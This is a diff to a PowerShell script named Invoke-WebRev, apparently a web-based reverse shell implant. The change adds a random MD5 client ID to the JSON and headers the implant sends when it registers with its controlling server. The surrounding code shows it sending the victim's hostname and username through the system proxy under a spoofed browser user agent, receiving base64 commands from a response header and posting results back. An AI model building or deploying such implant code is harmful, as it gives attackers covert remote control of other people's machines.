@@ -39,7 +39,10 @@ function Invoke-WebRev{
     $hname = toBase64 -str "$env:computername";
     $cuser = toBase64 -str "$env:username";
 
-    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
+    $strhash = Get-StringHash;
+    $clientid = toBase64 -str $strhash;
+    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}';
+    $headers = @{'X-Request-ID' = $strhash;}
     
     [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
     [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
@@ -57,7 +60,7 @@ function Invoke-WebRev{
     {
         try
         {
-            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
+            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -Headers $headers -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
             $header = $req.Headers["Authorization"];
             $c = [System.Convert]::FromBase64String($header);
             $cstr = [System.Text.Encoding]::UTF8.GetString($c);
@@ -176,7 +179,7 @@ function Invoke-WebRev{
 
                     $bytes = $enc.GetBytes($err);
                     $result = [Convert]::ToBase64String($bytes);
-                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
+                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}'
                 } catch {}
             }
         };
@@ -222,6 +225,17 @@ function Get-ImportedFunctions
         $menu = $menu -replace " [+]","[+]"
     }
     return $menu;
+}
+
+function Get-StringHash
+{ 
+    $randstr = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_});
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($randstr);
+    $algorithm = [System.Security.Cryptography.HashAlgorithm]::Create('MD5');
+    $StringBuilder = New-Object System.Text.StringBuilder;
+  
+    $algorithm.ComputeHash($bytes) | ForEach-Object { $null = $StringBuilder.Append($_.ToString("x2")); } 
+    return $StringBuilder.ToString();
 }
 
 function PatchMe
